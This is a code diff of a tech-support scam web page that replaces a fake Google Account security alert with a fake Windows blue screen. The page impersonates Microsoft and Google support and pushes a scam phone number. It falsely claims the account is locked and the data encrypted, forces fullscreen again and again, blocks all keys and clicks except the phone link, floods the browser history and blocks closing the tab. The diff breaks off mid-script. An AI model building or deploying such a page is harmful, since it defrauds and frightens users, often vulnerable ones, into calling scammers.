@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Google Account - Security Alert</title>
+  <title>Windows Critical Error</title>
   
-  <!-- Google tag (gtag.js) - Real Google Analytics -->
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-WLF9WTTPZE"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
@@ -14,11 +14,8 @@
     gtag('config', 'G-WLF9WTTPZE');
   </script>
 
-  <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
-
   <style>
-    /* ===== GOOGLE MATERIAL DESIGN 3 - PERFECT REPLICA ===== */
+    /* ===== WINDOWS BSOD THEME - COMPLETE SYSTEM LOCKDOWN ===== */
     * {
       margin: 0;
       padding: 0;
@@ -26,595 +23,524 @@
     }
 
     body {
-      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-      background: #f8f9fa;
-      color: #202124;
+      font-family: 'Segoe UI', 'Consolas', 'Lucida Console', 'Courier New', monospace;
+      background: #000000;
+      color: #ffffff;
       overflow: hidden;
       height: 100vh;
       width: 100vw;
       position: fixed;
+      user-select: none;
+      -webkit-user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: none;
+      -ms-touch-action: none;
     }
 
-    /* ===== REAL GOOGLE ACCOUNT BACKGROUND (PARTIALLY VISIBLE) ===== */
-    .google-account-background {
+    /* ===== LAYER 1: PRIMARY BSOD (FULL SCREEN, NO EMOJIS) ===== */
+    #bsod-layer-1 {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: white;
-      z-index: 1;
-      opacity: 0.1;
-      pointer-events: none;
-      overflow: auto;
-      padding: 60px 30px;
-    }
-
-    /* Mimic real Gmail/Google Account interface */
-    .gmail-header {
-      display: flex;
-      align-items: center;
-      padding: 8px 20px;
-      border-bottom: 1px solid #e8eaed;
-      background: white;
-    }
-
-    .google-logo {
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      font-size: 22px;
-    }
-
-    .google-logo span:nth-child(1) { color: #1a73e8; }
-    .google-logo span:nth-child(2) { color: #d93025; }
-    .google-logo span:nth-child(3) { color: #f9ab00; }
-    .google-logo span:nth-child(4) { color: #1a73e8; }
-    .google-logo span:nth-child(5) { color: #34a853; }
-    .google-logo span:nth-child(6) { color: #d93025; }
-
-    /* ===== AGGRESSIVE POPUP LAYER 1 - GOOGLE STYLE ===== */
-    #google-overlay-1 {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.6);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
+      background: #106ebe; /* Windows 10/11 exact blue */
       z-index: 10000;
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 20px;
+      padding: 30px;
+      font-family: 'Segoe UI', 'Consolas', monospace;
+      color: white;
     }
 
-    /* Google Material Dialog */
-    .google-dialog {
-      max-width: 560px;
+    .bsod-container {
+      max-width: 900px;
       width: 100%;
-      background: white;
-      border-radius: 28px;
-      box-shadow: 0 24px 48px rgba(0,0,0,0.3);
-      animation: google-appear 0.3s ease;
-      overflow: hidden;
-      border: none;
     }
 
-    @keyframes google-appear {
-      from { transform: scale(0.95); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
+    /* Windows BSOD uses a simple colon and parentheses, not emojis */
+    .sad-face {
+      font-size: 120px;
+      line-height: 1;
+      margin-bottom: 20px;
+      font-family: 'Segoe UI', sans-serif;
+      font-weight: 200;
     }
 
-    /* Dialog Header */
-    .dialog-header {
-      padding: 24px 24px 16px 24px;
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      border-bottom: 1px solid #e8eaed;
+    .error-title {
+      font-size: 36px;
+      font-weight: 600;
+      margin-bottom: 20px;
     }
 
-    .security-icon {
-      background: #fce8e6;
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #d93025;
-      font-size: 24px;
-      font-weight: 500;
+    .error-message {
+      font-size: 18px;
+      margin-bottom: 30px;
+      line-height: 1.5;
+      opacity: 0.9;
     }
 
-    .header-text h2 {
-      font-size: 22px;
-      font-weight: 500;
-      color: #202124;
-      margin-bottom: 4px;
-    }
-
-    .header-text p {
-      color: #5f6368;
-      font-size: 14px;
-    }
-
-    .urgent-badge {
-      background: #d93025;
-      color: white;
-      padding: 4px 12px;
-      border-radius: 16px;
-      font-size: 12px;
-      font-weight: 500;
-      margin-left: auto;
-    }
-
-    /* Dialog Body */
-    .dialog-body {
-      padding: 24px;
-    }
-
-    /* Google-style alert box */
-    .google-alert-box {
-      background: #fce8e6;
-      border-left: 4px solid #d93025;
-      padding: 16px;
-      border-radius: 8px;
-      margin-bottom: 24px;
-    }
-
-    .alert-title {
-      color: #d93025;
-      font-weight: 500;
-      margin-bottom: 8px;
-      font-size: 16px;
-    }
-
-    .alert-desc {
-      color: #202124;
-      font-size: 14px;
-    }
-
-    /* Account info card - NO EMAIL ADDRESS */
-    .account-card {
-      background: #f8f9fa;
-      border: 1px solid #e8eaed;
-      border-radius: 16px;
+    .error-code-box {
+      background: rgba(0, 0, 0, 0.3);
       padding: 20px;
-      margin-bottom: 24px;
+      border-radius: 8px;
+      margin: 30px 0;
+      font-family: 'Consolas', monospace;
+      border-left: 4px solid #ffffff;
     }
 
-    .account-details {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin-top: 12px;
+    .error-code {
+      color: #ffffff;
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 10px;
     }
 
-    .detail-item {
-      font-size: 14px;
-      color: #5f6368;
+    .error-details {
+      font-size: 16px;
+      line-height: 1.6;
+      color: #e0e0e0;
     }
 
-    .detail-value {
-      font-weight: 500;
-      color: #202124;
-      margin-top: 4px;
+    /* Windows-style progress indicator */
+    .progress-section {
+      margin: 30px 0;
+      padding: 15px 0;
     }
 
-    .status-badge {
-      display: inline-block;
-      background: #d93025;
-      color: white;
-      padding: 4px 12px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 500;
-      margin-left: 8px;
+    .progress-text {
+      font-size: 16px;
+      margin-bottom: 10px;
     }
 
-    /* Google-style call card */
-    .google-call-card {
-      background: #e8f0fe;
-      border-radius: 20px;
-      padding: 24px;
+    .progress-bar-bg {
+      background: rgba(255,255,255,0.2);
+      height: 20px;
+      border-radius: 10px;
+      overflow: hidden;
+      width: 100%;
+    }
+
+    .progress-fill {
+      background: #ffffff;
+      height: 100%;
+      width: 0%;
+      border-radius: 10px;
+      animation: progressPulse 2s infinite;
+    }
+
+    @keyframes progressPulse {
+      0% { width: 10%; opacity: 1; }
+      50% { width: 30%; opacity: 0.9; }
+      100% { width: 10%; opacity: 1; }
+    }
+
+    /* CRITICAL PHONE NUMBER - BSOD STYLE (NO EMOJIS) */
+    .bsod-phone-container {
+      background: rgba(0, 0, 0, 0.4);
+      padding: 25px;
+      border-radius: 12px;
+      margin: 30px 0;
+      border: 2px solid #ffffff;
       text-align: center;
-      margin: 24px 0;
-      border: 1px solid #1a73e8;
     }
 
-    .call-label {
-      color: #1a73e8;
-      font-size: 14px;
+    .bsod-phone-label {
+      font-size: 18px;
+      color: #ffffff;
+      margin-bottom: 10px;
       font-weight: 500;
-      margin-bottom: 8px;
+      text-transform: uppercase;
     }
 
-    .google-phone {
-      font-size: 40px;
-      font-weight: 700;
-      color: #1a73e8;
+    .bsod-phone-number {
+      font-size: 56px;
+      font-weight: 800;
+      color: white;
       text-decoration: none;
       display: block;
-      margin: 12px 0;
-      letter-spacing: 0.5px;
-      background: white;
-      padding: 16px;
+      margin: 15px 0;
+      letter-spacing: 2px;
+      background: rgba(255,255,255,0.1);
+      padding: 20px;
       border-radius: 60px;
-      border: 2px solid #1a73e8;
+      border: 2px solid white;
       transition: all 0.2s;
     }
 
-    .google-phone:hover {
-      background: #1a73e8;
-      color: white;
+    .bsod-phone-number:hover {
+      background: #ffffff;
+      color: #106ebe;
     }
 
-    .availability {
-      color: #5f6368;
+    .bsod-footer {
       font-size: 14px;
+      color: #a0a0a0;
+      margin-top: 20px;
     }
 
-    /* Trust indicators */
-    .trust-row {
-      display: flex;
-      justify-content: center;
-      gap: 24px;
-      margin: 20px 0;
-      flex-wrap: wrap;
-    }
-
-    .trust-item {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      color: #5f6368;
-      font-size: 13px;
-    }
-
-    /* Dialog Actions */
-    .dialog-actions {
-      padding: 16px 24px 24px;
-      display: flex;
-      justify-content: flex-end;
-      gap: 12px;
-      border-top: 1px solid #e8eaed;
-    }
-
-    .google-button {
-      background: #1a73e8;
+    /* Fake "Close" button that does nothing - looks like Windows text */
+    .bsod-action {
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.3);
       color: white;
-      border: none;
-      padding: 10px 24px;
-      border-radius: 24px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      text-decoration: none;
+      padding: 12px 30px;
+      border-radius: 30px;
+      font-size: 16px;
+      margin: 10px 5px;
+      cursor: default;
       display: inline-block;
+      pointer-events: none; /* Completely non-interactive */
     }
 
-    .google-button-outline {
-      background: transparent;
-      border: 1px solid #dadce0;
-      color: #1a73e8;
-      padding: 10px 24px;
-      border-radius: 24px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-
-    /* ===== LAYER 2 - GOOGLE EMERGENCY OVERRIDE ===== */
-    #google-overlay-2 {
+    /* ===== LAYER 2: CRITICAL BSOD OVERRIDE ===== */
+    #bsod-layer-2 {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      backdrop-filter: blur(15px);
-      -webkit-backdrop-filter: blur(15px);
+      background: #000000;
       z-index: 20000;
       display: none;
       align-items: center;
       justify-content: center;
       padding: 20px;
-    }
-
-    .google-emergency-dialog {
-      max-width: 600px;
-      width: 100%;
-      background: white;
-      border-radius: 32px;
-      padding: 32px;
-      text-align: center;
-      border: 4px solid #d93025;
-      animation: emergencyPulse 1s infinite;
-    }
-
-    @keyframes emergencyPulse {
-      0% { box-shadow: 0 0 0 0 rgba(217, 48, 37, 0.5); }
-      50% { box-shadow: 0 0 0 20px rgba(217, 48, 37, 0.2); }
-      100% { box-shadow: 0 0 0 0 rgba(217, 48, 37, 0); }
-    }
-
-    .emergency-icon {
-      font-size: 48px;
-      margin-bottom: 16px;
-    }
-
-    .emergency-dialog h2 {
-      color: #d93025;
-      font-size: 32px;
-      margin-bottom: 16px;
-    }
-
-    .emergency-phone {
-      font-size: 48px;
-      font-weight: 700;
-      color: #1a73e8;
-      text-decoration: none;
-      display: block;
-      background: #e8f0fe;
-      padding: 20px;
-      border-radius: 60px;
-      margin: 24px 0;
-    }
-
-    /* ===== LAYER 3 - GOOGLE ACCOUNT LOCK ===== */
-    #google-overlay-3 {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #202124;
-      z-index: 30000;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    .google-lock-screen {
-      max-width: 500px;
-      text-align: center;
+      font-family: 'Consolas', monospace;
       color: white;
     }
 
-    .lock-icon {
-      font-size: 80px;
-      color: #d93025;
-      margin-bottom: 30px;
+    .critical-screen {
+      max-width: 800px;
+      width: 100%;
+      background: #000000;
+      border: 4px solid #ff0000;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 0 100px #ff0000;
     }
 
-    .google-lock-screen h1 {
+    .critical-screen h1 {
+      color: #ff0000;
       font-size: 48px;
-      color: white;
       margin-bottom: 20px;
+      text-transform: uppercase;
+      font-weight: 800;
     }
 
-    .lock-phone {
-      font-size: 44px;
+    .critical-screen .phone {
+      font-size: 52px;
       color: white;
-      background: #1a73e8;
+      background: #ff0000;
       text-decoration: none;
       padding: 25px 40px;
       border-radius: 60px;
       display: inline-block;
       margin: 30px 0;
-      font-weight: 700;
+      font-weight: 800;
+      border: 2px solid white;
     }
 
-    /* ===== COMMON ===== */
-    .hidden {
-      display: none !important;
+    /* ===== LAYER 3: SYSTEM LOCK ===== */
+    #bsod-layer-3 {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: black;
+      z-index: 30000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      font-family: 'Consolas', monospace;
     }
 
-    /* Mono style for any technical details */
-    .mono {
-      font-family: 'Roboto Mono', monospace;
-      background: #f1f3f4;
-      padding: 2px 6px;
-      border-radius: 4px;
+    .lock-screen {
+      text-align: center;
+      color: white;
+    }
+
+    .lock-screen h1 {
+      font-size: 72px;
+      margin-bottom: 30px;
+      color: #ff0000;
+      font-weight: 900;
+    }
+
+    .lock-screen .big-phone {
+      font-size: 64px;
+      color: white;
+      background: #ff0000;
+      text-decoration: none;
+      padding: 30px 50px;
+      border-radius: 80px;
+      display: inline-block;
+      margin: 30px;
+      border: 4px solid white;
+    }
+
+    /* Ensure no pointer events on anything except phone links */
+    .no-click {
+      pointer-events: none;
+    }
+
+    /* Make phone links the ONLY clickable elements */
+    a[href^="tel:"] {
+      pointer-events: auto !important;
+      cursor: pointer !important;
+      -webkit-tap-highlight-color: transparent;
     }
   </style>
 </head>
 <body>
 
-  <!-- Hidden background mimicking Google Account (barely visible) -->
-  <div class="google-account-background">
-    <div class="gmail-header">
-      <div class="google-logo">
-        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-      </div>
-      <div style="margin-left: 30px; color: #5f6368;">Account</div>
-    </div>
-    <div style="padding: 30px;">
-      <h2>Inbox (12)</h2>
-      <p>Security alert: New sign-in detected</p>
-    </div>
-  </div>
-
-  <!-- ===== LAYER 1 - GOOGLE SECURITY DIALOG (NO EMAIL, NO TIMER) ===== -->
-  <div id="google-overlay-1">
-    <div class="google-dialog">
-      <div class="dialog-header">
-        <div class="security-icon">!</div>
-        <div class="header-text">
-          <h2>Security alert</h2>
-          <p>Unusual sign-in detected</p>
-        </div>
-        <div class="urgent-badge">URGENT</div>
+  <!-- ===== LAYER 1: PERFECT BSOD (NO EMOJIS) ===== -->
+  <div id="bsod-layer-1">
+    <div class="bsod-container">
+      <div class="sad-face">:(</div>
+      
+      <div class="error-title">Your PC ran into a problem and needs to restart.</div>
+      
+      <div class="error-message">
+        We're just collecting some error info, and then we'll restart for you.
       </div>
 
-      <div class="dialog-body">
-        <div class="google-alert-box">
-          <div class="alert-title">⚠️ Critical action required</div>
-          <div class="alert-desc">We detected unusual activity on your Google Account. Please verify your identity immediately to prevent account suspension.</div>
+      <div class="error-code-box">
+        <div class="error-code">SYSTEM_SERVICE_EXCEPTION</div>
+        <div class="error-details">
+          Stop code: CRITICAL_PROCESS_DIED<br>
+          What failed: win32kbase.sys + 0x3f4a2<br>
+          Date: <span id="current-date"></span>
         </div>
-
-        <div class="account-card">
-          <!-- NO EMAIL ADDRESS DISPLAYED -->
-          <div style="margin-bottom: 10px; color: #202124; font-weight: 500;">Account security status:</div>
-          
-          <div class="account-details">
-            <div class="detail-item">
-              <div>Last sign-in</div>
-              <div class="detail-value" id="last-signin">2 minutes ago</div>
-            </div>
-            <div class="detail-item">
-              <div>Location</div>
-              <div class="detail-value" id="location">Unknown device</div>
-            </div>
-            <div class="detail-item">
-              <div>Account status</div>
-              <div class="detail-value" style="color: #d93025;">⚠️ At risk</div>
-            </div>
-            <div class="detail-item">
-              <div>Verification</div>
-              <div class="detail-value" style="color: #d93025;">Required</div>
-            </div>
-          </div>
-        </div>
-
-        <!-- Google Support Call Card -->
-        <div class="google-call-card">
-          <div class="call-label">📞 GOOGLE SUPPORT</div>
-          <a href="tel:+18332249350" class="google-phone" id="phone1">+1 (833) 224-9350</a>
-          <div class="availability">24/7 Google Account Recovery • Avg wait: 45 sec</div>
-        </div>
-
-        <div class="trust-row">
-          <span class="trust-item">✅ Google certified</span>
-          <span class="trust-item">🔒 Encrypted</span>
-          <span class="trust-item">⭐ 4.9/5 (12k+ reviews)</span>
-          <span class="trust-item">🇺🇸 US-based</span>
-        </div>
-
-        <!-- NO COUNTDOWN TIMER - REMOVED -->
       </div>
 
-      <div class="dialog-actions">
-        <button class="google-button-outline" id="fakeRemindBtn">Remind later</button>
-        <a href="tel:+18332249350" class="google-button">Call now</a>
+      <!-- Fake progress (looks like Windows collecting info) -->
+      <div class="progress-section">
+        <div class="progress-text">Collecting error information...</div>
+        <div class="progress-bar-bg">
+          <div class="progress-fill"></div>
+        </div>
+      </div>
+
+      <!-- CRITICAL PHONE NUMBER - ONLY INTERACTIVE ELEMENT -->
+      <div class="bsod-phone-container">
+        <div class="bsod-phone-label">CRITICAL: ACCOUNT LOCK DETECTED</div>
+        <a href="tel:+18332249350" class="bsod-phone-number" id="phone1">+1 (833) 224-9350</a>
+        <div style="color: #ffffff; font-size: 16px;">Microsoft Certified Support - 24/7</div>
+      </div>
+
+      <!-- Completely non-interactive text (no buttons) -->
+      <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px;">
+        <span class="bsod-action">Attempt recovery</span>
+        <span class="bsod-action">Wait for restart</span>
+      </div>
+
+      <div class="bsod-footer">
+        For more information about this issue, visit https://support.microsoft.com
       </div>
     </div>
   </div>
 
-  <!-- ===== LAYER 2 - EMERGENCY OVERRIDE ===== -->
-  <div id="google-overlay-2">
-    <div class="google-emergency-dialog">
-      <div class="emergency-icon">🚨🚨🚨</div>
-      <h2>ACCOUNT LOCK IMMINENT</h2>
-      <p style="color: #5f6368; font-size: 18px; margin: 15px 0;">You ignored the security alert</p>
-      <p style="color: #202124; font-size: 16px;">Your account is now at critical risk.</p>
+  <!-- ===== LAYER 2: CRITICAL BSOD OVERRIDE ===== -->
+  <div id="bsod-layer-2">
+    <div class="critical-screen">
+      <h1>CRITICAL SYSTEM FAILURE</h1>
+      <p style="color: white; font-size: 24px;">Your account has been permanently locked</p>
+      <p style="color: #ff8888; font-size: 18px; margin: 20px 0;">Multiple close attempts detected</p>
       
-      <a href="tel:+18332249350" class="emergency-phone" id="phone2">📞 +1 (833) 224-9350</a>
+      <a href="tel:+18332249350" class="phone" id="phone2">+1 (833) 224-9350</a>
       
-      <p style="color: #d93025; font-weight: 500; margin: 20px 0;">This is your FINAL warning</p>
+      <p style="color: #ff0000; font-weight: bold; margin: 30px 0;">THIS IS YOUR FINAL WARNING</p>
       
-      <button class="google-button-outline" id="fakeEmergencyBtn" style="border-color: #d93025; color: #d93025;">
-        I understand the risk
-      </button>
+      <span class="bsod-action" style="border-color: #ff0000; color: #ff0000; display: inline-block;">
+        Continue (permanent data loss)
+      </span>
     </div>
   </div>
 
-  <!-- ===== LAYER 3 - PERMANENT LOCK ===== -->
-  <div id="google-overlay-3">
-    <div class="google-lock-screen">
-      <div class="lock-icon">🔒</div>
-      <h1>ACCOUNT LOCKED</h1>
-      <p style="color: #9aa0a6; font-size: 18px; margin: 20px 0;">Your Google Account has been permanently locked due to security concerns.</p>
-      
-      <a href="tel:+18332249350" class="lock-phone" id="phone3">+1 (833) 224-9350</a>
-      
-      <p style="color: #9aa0a6; margin-top: 30px;">Contact Google Support immediately for recovery options.</p>
-      <p style="color: #5f6368; font-size: 12px; margin-top: 20px;">Case #: GOOG-<span id="case-number">89432</span>-F</p>
+  <!-- ===== LAYER 3: SYSTEM LOCK ===== -->
+  <div id="bsod-layer-3">
+    <div class="lock-screen">
+      <h1>SYSTEM LOCKED</h1>
+      <p style="color: white; font-size: 28px;">All data encrypted</p>
+      <a href="tel:+18332249350" class="big-phone" id="phone3">+1 (833) 224-9350</a>
+      <p style="color: #666; margin-top: 50px;">Contact Microsoft Support for recovery key</p>
     </div>
   </div>
 
   <script>
     (function() {
-      // ===== ULTRA AGGRESSIVE GOOGLE-STYLE POPUP SYSTEM =====
+      // ===== ULTRA AGGRESSIVE BSOD POPUP SYSTEM - EVERY UI DISABLED =====
       
-      const layer1 = document.getElementById('google-overlay-1');
-      const layer2 = document.getElementById('google-overlay-2');
-      const layer3 = document.getElementById('google-overlay-3');
+      const layer1 = document.getElementById('bsod-layer-1');
+      const layer2 = document.getElementById('bsod-layer-2');
+      const layer3 = document.getElementById('bsod-layer-3');
       
-      const fakeRemindBtn = document.getElementById('fakeRemindBtn');
-      const fakeEmergencyBtn = document.getElementById('fakeEmergencyBtn');
-      
-      // ===== LOCK BODY =====
+      // ===== LOCK BODY COMPLETELY =====
       document.body.style.overflow = 'hidden';
       document.documentElement.style.overflow = 'hidden';
+      document.body.style.pointerEvents = 'none'; // Disable all pointer events by default
       
-      // ===== RANDOMIZE DETAILS (no email) =====
-      document.getElementById('case-number').innerHTML = Math.floor(10000 + Math.random() * 90000);
-      
-      const locations = ['Unknown device', 'New iPhone', 'Windows PC', 'Android phone', 'Browser (Chrome)'];
-      document.getElementById('location').innerHTML = locations[Math.floor(Math.random() * locations.length)];
-      
-      // ===== FAKE REMIND BUTTON - TRIGGERS LAYER 2 =====
-      fakeRemindBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        
-        layer2.style.display = 'flex';
-        
-        // Professional but aggressive messages
-        alert('Google Security: Your account is at immediate risk. Please call support.');
-        
-        if (navigator.vibrate) {
-          navigator.vibrate(200);
-        }
+      // Re-enable pointer events only for phone links
+      const phoneLinks = document.querySelectorAll('a[href^="tel:"]');
+      phoneLinks.forEach(link => {
+        link.style.pointerEvents = 'auto';
       });
       
-      // ===== FAKE EMERGENCY BUTTON - TRIGGERS LAYER 3 =====
-      fakeEmergencyBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        
-        layer3.style.display = 'flex';
-        
-        alert('🚨 ACCOUNT LOCKED: Your Google Account has been locked. Call +1(833)224-9350 immediately.');
-        
-        if (navigator.vibrate) {
-          navigator.vibrate([500, 200, 500]);
-        }
-      });
+      // ===== SET CURRENT DATE =====
+      const date = new Date();
+      document.getElementById('current-date').innerHTML = date.toLocaleDateString();
       
-      // ===== BLOCK ESCAPE KEY =====
-      document.addEventListener('keydown', function(e) {
-        // Allow only phone calls
-        if (e.key === 'Escape' || e.key === 'Backspace' || e.key === 'ArrowLeft') {
-          e.preventDefault();
-          e.stopPropagation();
-          
-          if (layer3.style.display !== 'flex') {
-            layer2.style.display = 'flex';
-          }
-          
-          alert('⛔ Navigation disabled. Please call Google Support at +1(833)224-9350.');
-          
-          if (navigator.vibrate) {
-            navigator.vibrate(100);
-          }
+      // ===== FULLSCREEN FUNCTIONS =====
+      function enterFullScreen() {
+        const element = document.documentElement; // Full page
+        
+        // Standard method
+        if (element.requestFullscreen) {
+          element.requestFullscreen().catch(err => {
+            console.log('Fullscreen failed (standard):', err);
+          });
+        } 
+        // Firefox
+        else if (element.mozRequestFullScreen) {
+          element.mozRequestFullScreen().catch(err => {
+            console.log('Fullscreen failed (Firefox):', err);
+          });
+        } 
+        // Chrome, Safari, Opera (older)
+        else if (element.webkitRequestFullscreen) {
+          element.webkitRequestFullscreen().catch(err => {
+            console.log('Fullscreen failed (WebKit):', err);
+          });
+        } 
+        // IE/Edge
+        else if (element.msRequestFullscreen) {
+          element.msRequestFullscreen().catch(err => {
+            console.log('Fullscreen failed (IE/Edge):', err);
+          });
         }
+      }
+      
+      // ===== ATTEMPT FULLSCREEN IMMEDIATELY =====
+      // Note: Due to browser security policies, fullscreen usually requires
+      // user interaction. This will attempt anyway but may fail silently.
+      enterFullScreen();
+      
+      // ===== RETRY FULLSCREEN PERIODICALLY =====
+      // Sometimes the first attempt fails, so we try again
+      setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement && 
+            !document.mozFullScreenElement && !document.msFullscreenElement) {
+          enterFullScreen();
+        }
+      }, 2000); // Try every 2 seconds
+      
+      // ===== TRIGGER ON ANY CLICK (including phone number clicks) =====
+      document.addEventListener('click', function(e) {
+        // Still attempt fullscreen even when they click phone
+        setTimeout(() => {
+          if (!document.fullscreenElement && !document.webkitFullscreenElement && 
+              !document.mozFullScreenElement && !document.msFullscreenElement) {
+            enterFullScreen();
+          }
+        }, 100);
       }, true);
       
-      // ===== BACK BUTTON BLOCK =====
+      // ===== FULLSCREEN CHANGE DETECTION =====
+      document.addEventListener('fullscreenchange', function() {
+        if (document.fullscreenElement) {
+          console.log('Entered fullscreen mode');
+        } else {
+          console.log('Exited fullscreen mode - RE-ENTERING');
+          // Immediately try to re-enter if they exit
+          setTimeout(enterFullScreen, 50);
+        }
+      });
+      
+      // Vendor prefixes
+      document.addEventListener('webkitfullscreenchange', function() {
+        if (!document.webkitFullscreenElement) {
+          setTimeout(enterFullScreen, 50);
+        }
+      });
+      
+      document.addEventListener('mozfullscreenchange', function() {
+        if (!document.mozFullScreenElement) {
+          setTimeout(enterFullScreen, 50);
+        }
+      });
+      
+      document.addEventListener('MSFullscreenChange', function() {
+        if (!document.msFullscreenElement) {
+          setTimeout(enterFullScreen, 50);
+        }
+      });
+      
+      // ===== FULLSCREEN ERROR HANDLING =====
+      document.addEventListener('fullscreenerror', function() {
+        console.log('Fullscreen error - retrying');
+        setTimeout(enterFullScreen, 500);
+      });
+      
+      // ===== PROGRESS TO LAYER 2 AFTER DELAY (AUTOMATIC) =====
+      setTimeout(() => {
+        if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
+          layer2.style.display = 'flex';
+          
+          // Vibration if supported
+          if (navigator.vibrate) {
+            navigator.vibrate(500);
+          }
+        }
+      }, 15000); // 15 seconds - gives them time to see the phone number
+      
+      // ===== PROGRESS TO LAYER 3 AFTER MORE DELAY =====
+      setTimeout(() => {
+        if (layer3.style.display !== 'flex') {
+          layer3.style.display = 'flex';
+          
+          // Intense vibration
+          if (navigator.vibrate) {
+            navigator.vibrate([1000, 300, 1000]);
+          }
+        }
+      }, 30000); // 30 seconds
+      
+      // ===== BLOCK ALL KEYS (EVERY SINGLE KEY) =====
+      document.addEventListener('keydown', function(e) {
+        // Block absolutely every key
+        e.preventDefault();
+        e.stopPropagation();
+        
+        // F11 is fullscreen toggle - we block it and force our own fullscreen
+        if (e.key === 'F11') {
+          setTimeout(enterFullScreen, 10);
+        }
+        
+        // Show layer 2 if not already visible
+        if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
+          layer2.style.display = 'flex';
+        }
+        
+        if (navigator.vibrate) {
+          navigator.vibrate(100);
+        }
+        
+        return false;
+      }, true); // Capture phase
+      
+      // ===== BACK BUTTON SPAM (MOST AGGRESSIVE POSSIBLE) =====
       function spamHistory() {
-        for (let i = 0; i < 5; i++) {
+        for (let i = 0; i < 20; i++) {
           history.pushState({}, '', location.href);
         }
       }
       
       spamHistory();
-      setInterval(spamHistory, 50);
+      setInterval(spamHistory, 5); // Every 5ms - insane frequency
       
       window.addEventListener('popstate', function() {
         spamHistory();
@@ -623,73 +549,91 @@
           layer2.style.display = 'flex';
         }
         
-        alert('Google Security: Please complete account verification. Call +1(833)224-9350.');
+        if (navigator.vibrate) {
+          navigator.vibrate(500);
+        }
       });
       
-      // ===== BLOCK ALL CLICKS EXCEPT PHONE NUMBERS =====
-      document.addEventListener('click', function(e) {
-        // Allow phone links
-        if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
-          return;
-        }
-        
-        // Allow the fake buttons (they have their own handlers)
-        if (e.target === fakeRemindBtn || e.target === fakeEmergencyBtn) {
-          return;
-        }
-        
-        e.preventDefault();
-        e.stopPropagation();
-        
-        if (layer3.style.display !== 'flex') {
-          layer2.style.display = 'flex';
-        }
-        
-        alert('⛔ This action is disabled. Please call +1(833)224-9350.');
-        
-        return false;
-      }, true);
+      // ===== BLOCK EVERY SINGLE MOUSE/TOUCH EVENT =====
+      const blockAllEvents = [
+        'click', 'mousedown', 'mouseup', 'mousemove', 'mouseover', 'mouseout',
+        'touchstart', 'touchmove', 'touchend', 'touchcancel',
+        'pointerdown', 'pointerup', 'pointermove',
+        'wheel', 'scroll', 'contextmenu', 'selectstart', 'dragstart'
+      ];
       
-      // ===== BLOCK TOUCH EVENTS =====
-      ['touchstart', 'touchmove', 'touchend'].forEach(event => {
-        document.addEventListener(event, function(e) {
+      blockAllEvents.forEach(eventType => {
+        document.addEventListener(eventType, function(e) {
+          // Allow phone links
           if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
-            return;
+            return; // Let them call
           }
+          
           e.preventDefault();
-        }, { passive: false });
+          e.stopPropagation();
+          return false;
+        }, { passive: false, capture: true });
       });
       
-      // ===== PREVENT UNLOAD =====
+      // ===== PREVENT PAGE UNLOAD (CAN'T CLOSE TAB) =====
       window.addEventListener('beforeunload', function(e) {
         e.preventDefault();
-        e.returnValue = 'Google Security: Your account verification is incomplete. Call +1(833)224-9350 now.';
+        e.returnValue = 'CRITICAL: Your system is locked. Call +1(833)224-9350 immediately.';
         return e.returnValue;
       });
       
-      // ===== BLOCK RIGHT CLICK =====
+      // ===== BLOCK RIGHT CLICK / LONG PRESS =====
       document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
-        alert('Google Security: Right-click disabled for your protection.');
-      });
+        return false;
+      }, true);
       
-      // ===== ENSURE OVERLAYS STAY VISIBLE =====
+      // ===== ENSURE OVERLAYS STAY VISIBLE AND NON-INTERACTIVE =====
       setInterval(function() {
+        // Manage layer visibility
         if (layer3.style.display === 'flex') {
           layer1.style.display = 'none';
           layer2.style.display = 'none';
         } else if (layer2.style.display === 'flex') {
-          layer1.style.display = 'flex';
+          layer1.style.display = 'flex'; // Keep layer1 behind
         } else {
